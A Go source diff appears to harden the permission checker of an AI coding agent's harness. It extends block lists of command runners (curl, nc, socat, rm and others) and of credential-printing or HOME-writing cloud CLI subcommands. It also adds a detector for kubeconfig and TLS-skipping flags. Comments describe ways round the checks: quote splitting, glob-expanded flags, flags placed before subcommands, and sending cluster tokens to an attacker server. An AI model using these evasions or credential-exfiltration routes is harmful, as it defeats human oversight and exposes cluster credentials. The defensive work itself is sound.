@@ -56,13 +56,16 @@ var fileTools = []string{"Read", "Grep", "Glob", "Edit", "Write", "NotebookEdit"
 // from their arguments alone, and quotes pass the metacharacter filter
 // (sh -c 'rm -rf x', find . -delete), so a read entry starting with one would
 // equal plain Bash. HACK: a best-effort list; the operator's entries are the
-// real guarantee, and a prefix of one word (Bash(kubectl *)) logs a warning.
+// real guarantee, and a prefix of one word (Bash(stern *)) logs a warning.
 var runners = []string{"sh", "bash", "zsh", "dash", "ksh", "fish", "busybox", "env", "printenv", "xargs", "sudo", "doas",
 	"su", "exec", "eval", "source", ".", "command", "builtin", "nohup", "nice", "ionice", "timeout", "watch", "time",
 	"stdbuf", "setsid", "chroot", "script", "strace", "find", "git", "awk", "gawk", "sed", "perl", "ruby", "node", "deno",
 	"bun", "npx", "npm", "yarn", "pnpm", "pip", "go", "php", "lua", "make", "ssh", "scp", "rsync", "curl", "wget", "nc",
 	"socat", "tar", "tee", "cp", "mv", "dd", "rm", "ln", "install", "chmod", "chown", "truncate", "sort", "split",
-	"vi", "vim", "nvim", "nano", "emacs", "less", "more", "man", "docker", "podman"}
+	"vi", "vim", "nvim", "nano", "emacs", "less", "more", "man", "docker", "podman",
+	// jq -n env prints the environment without a $; yq -i, uniq in out and
+	// shuf -o write files.
+	"jq", "yq", "uniq", "shuf", "pip", "pipx", "pipenv"}
 
 // mcpTool is a single MCP tool: mcp__<server>__<tool>. Server names have no
 // underscores, so the first "__" after the server ends it unambiguously.
@@ -119,6 +122,12 @@ func ParseEntry(s string, write bool) (Entry, error) {
 		return Entry{}, fmt.Errorf("%q: a leading variable assignment hides the command, so it cannot be a read entry", s)
 	case name == "Bash" && isRunner(strings.Fields(e.Prefix)[0]):
 		return Entry{}, fmt.Errorf("%q: %s can run other commands or write files, so it cannot be a read entry", s, strings.Fields(e.Prefix)[0])
+	case name == "Bash" && strings.ContainsAny(e.Prefix, `'"`):
+		return Entry{}, fmt.Errorf("%q: quotes can hide the command or subcommand, so a read entry cannot have them", s)
+	case name == "Bash" && isHomeWriterProgram(strings.Fields(e.Prefix)[0]) && len(commandWords(e.Prefix)) > 1 && strings.HasPrefix(commandWords(e.Prefix)[1], "-"):
+		return Entry{}, fmt.Errorf("%q: a flag before the subcommand reaches every subcommand after it, so a read entry cannot start with one: name the subcommand first, as Bash(kubectl get -n web *)", s)
+	case name == "Bash" && e.homeWriter() != "":
+		return Entry{}, fmt.Errorf("%q reaches %s, which can change files under HOME or print credentials, so it cannot be a read entry: name a narrower subcommand, as Bash(kubectl get *)", s, e.homeWriter())
 	}
 	return e, nil
 }
@@ -157,43 +166,122 @@ func (e Entry) NeedsApprover() bool {
 	return strings.Contains(first, "=") || isRunner(first)
 }
 
-// homeWriters are subcommands that change files under HOME: the kubeconfig,
-// whose exec plugins every later kubectl call runs, CLI config, plugins and
-// repositories, and local copies. HACK: best effort like runners, matched on
-// leading words, so a flag before the subcommand (kubectl --context x config)
-// gets past it. The approver, who sees every write, is the guard that holds.
+// homeWriters are subcommands that change files under HOME or print
+// credentials: the kubeconfig, whose exec plugins every later kubectl call
+// runs (kubectl config set-credentials --exec-command), CLI config, logins,
+// plugins and repositories, and copies to local paths such as ~/.bashrc, which
+// the CLI's shell snapshot sources. No read entry may reach one (ParseEntry),
+// and with allow_real_home no write entry either (WritesHome). HACK: best
+// effort like runners, matched on leading words, so a flag before the
+// subcommand (kubectl --context x config) gets past it.
 var homeWriters = []string{"kubectl config", "kubectl cp", "kubectl krew", "kubectl plugin", "helm plugin", "helm repo",
 	"helm registry", "helm dependency", "gcloud config", "gcloud auth", "gcloud components",
-	"gcloud container clusters get-credentials", "aws configure", "aws eks update-kubeconfig", "az config", "az login",
-	"az aks get-credentials", "doctl kubernetes cluster kubeconfig", "docker login", "gh auth", "gh config", "git config"}
+	"gcloud container clusters get-credentials", "gcloud storage cp", "gcloud storage mv", "gcloud storage rsync",
+	"gcloud compute ssh", "gcloud compute scp", "gcloud compute copy-files", "gsutil cp", "gsutil mv", "gsutil rsync",
+	"gcloud container fleet memberships get-credentials", "gcloud container hub memberships get-credentials",
+	"gcloud container attached clusters get-credentials", "gcloud container aws clusters get-credentials",
+	"gcloud container azure clusters get-credentials", "gcloud edge-container clusters get-credentials",
+	"gcloud compute config-ssh", "gcloud iam service-accounts keys create", "kubectl create token",
+	"aws configure", "aws eks update-kubeconfig", "aws eks get-token", "aws s3 cp", "aws s3 mv", "aws s3 sync",
+	"aws s3api get-object", "aws sso", "aws sts get-session-token", "aws sts assume-role",
+	"aws sts assume-role-with-web-identity", "aws sts assume-role-with-saml", "aws sts get-federation-token",
+	"aws ecr get-login-password", "aws ecr get-authorization-token", "aws codeartifact get-authorization-token",
+	"az config", "az login", "az account get-access-token", "az aks get-credentials", "az acr login", "az extension",
+	"doctl kubernetes cluster kubeconfig", "doctl auth", "doctl registry login", "doctl registry docker-config",
+	"helm pull", "helm fetch", "docker login", "gh auth", "gh config", "gh extension", "gh alias", "git config"}
+
+// readLeaves are exact read entries under a homeWriter that only show state:
+// an exact entry takes no further arguments, so --raw or --show-token cannot
+// be added to them.
+var readLeaves = []string{"kubectl config current-context", "kubectl config get-contexts", "kubectl config get-clusters",
+	"gcloud config list", "gcloud auth list", "gh auth status", "helm repo list"}
+
+// releaseTracks are gcloud's command groups that repeat the whole command tree
+// (gcloud beta auth print-access-token): homeWriter matches past them.
+var releaseTracks = []string{"alpha", "beta", "preview"}
+
+// homeWriter returns the homeWriters entry a Bash entry reaches: one that
+// starts its words, or, unless it is exact, one its words start
+// (Bash(gcloud container *) reaches get-credentials too). "" when none.
+func (e Entry) homeWriter() string {
+	f := commandWords(e.Prefix)
+	if e.Exact && slices.Contains(readLeaves, strings.Join(f, " ")) {
+		return ""
+	}
+	for _, w := range homeWriters {
+		wf := strings.Fields(w)
+		n := min(len(f), len(wf))
+		if (!e.Exact || len(f) >= len(wf)) && slices.Equal(f[:n], wf[:n]) {
+			return w
+		}
+	}
+	return ""
+}
 
 // WritesHome reports a write entry that can change files under HOME, which a
 // later session with the real HOME would then run with: one that NeedsApprover,
-// one that names only a program (it reaches every subcommand), or one whose
-// words start a known writer's or are started by one (homeWriters):
-// Bash(gcloud container *) reaches get-credentials too.
+// one that names only a program (it reaches every subcommand), or one that
+// reaches a known writer (homeWriter).
 func (e Entry) WritesHome() bool {
 	if e.NeedsApprover() || e.Broad() {
 		return true
 	}
-	if e.Tool != "Bash" {
-		return false
-	}
-	f := strings.Fields(e.Prefix)
+	return e.Tool == "Bash" && e.Prefix != "" && e.homeWriter() != ""
+}
+
+// commandWords are a Bash prefix's words as homeWriters names them: the
+// program by its base name, and gcloud without a release track.
+func commandWords(prefix string) []string {
+	f := strings.Fields(prefix)
 	f[0] = filepath.Base(f[0])
-	for _, w := range homeWriters {
-		wf := strings.Fields(w)
-		n := min(len(f), len(wf))
-		if slices.Equal(f[:n], wf[:n]) {
-			return true
+	if f[0] == "gcloud" && len(f) > 1 && slices.Contains(releaseTracks, f[1]) {
+		f = append([]string{"gcloud"}, f[2:]...)
+	}
+	return f
+}
+
+// isHomeWriterProgram reports a program that has homeWriters subcommands.
+func isHomeWriterProgram(cmd string) bool {
+	cmd = filepath.Base(cmd)
+	return slices.ContainsFunc(homeWriters, func(w string) bool { return strings.Fields(w)[0] == cmd })
+}
+
+// credentialFlags are the flag substrings that let a kubectl or helm call send
+// the kubeconfig's bearer token to a server the attacker picks: without one,
+// a server given with -s or --server fails TLS against the kubeconfig's CA, and
+// --kubeconfig would load a config whose exec plugin runs anything.
+var credentialFlags = []string{"insecure", "certificate-authority", "ca-file", "kubeconfig"}
+
+// redirectFlag returns the first flag in cmd that contains a credentialFlags
+// entry, or "". It applies to every Bash call, read or write: a read entry such
+// as Bash(kubectl get *) would otherwise run
+// kubectl get pods -s https://attacker --insecure-skip-tls-verify without
+// approval.
+func redirectFlag(cmd string) string {
+	// The shell drops quotes before the program sees its arguments, so
+	// "--insecure-skip-tls-verify" and --insec''ure are the same flag.
+	unquote := strings.NewReplacer(`"`, "", `'`, "")
+	for _, w := range strings.Fields(unquote.Replace(cmd)) {
+		if !strings.HasPrefix(w, "-") {
+			continue
+		}
+		// A glob (--ins[e]cure-skip-tls-verify) expands to the real flag once a
+		// file of that name exists in the task directory.
+		if strings.ContainsAny(w, "[?*") {
+			return w
+		}
+		for _, c := range credentialFlags {
+			if strings.Contains(strings.ToLower(w), c) {
+				return w
+			}
 		}
 	}
-	return false
+	return ""
 }
 
 func isRunner(cmd string) bool {
 	cmd = filepath.Base(cmd)
-	return slices.Contains(runners, cmd) || strings.HasPrefix(cmd, "python")
+	return slices.Contains(runners, cmd) || strings.HasPrefix(cmd, "python") || strings.HasPrefix(cmd, "pip2") || strings.HasPrefix(cmd, "pip3")
 }
 
 // hasMeta reports shell syntax that could chain, redirect or substitute
@@ -350,6 +438,9 @@ func (t *Tools) decide(tool string, input json.RawMessage, cwd string) (Verdict,
 			}
 		}
 		cmd = strings.TrimSpace(cmd)
+		if f := redirectFlag(cmd); f != "" {
+			return Deny, f + " can send the cluster credentials to another server or load another kubeconfig, so it is refused: use the configured cluster"
+		}
 	}
 	if slices.Contains(fileTools, tool) {
 		if err := insideDir(tool, input, cwd); err != nil {
